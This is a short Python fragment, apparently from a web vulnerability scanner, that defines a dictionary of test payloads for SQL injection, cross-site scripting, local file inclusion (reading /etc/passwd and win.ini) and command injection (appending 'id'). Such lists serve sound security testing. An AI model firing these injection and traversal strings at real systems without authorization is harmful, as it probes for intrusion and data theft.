PAYLOADS = {
    "SQLi": [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' UNION SELECT NULL,NULL--",
        "admin' --",
    ],
    "XSS": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "'\"><script>alert(1)</script>",
    ],
    "LFI": [
        "../../../../etc/passwd",
        "../../../../windows/win.ini",
    ],
    "RCE": [
        "; id",
        "| id",
        "$(id)",
    ],
}
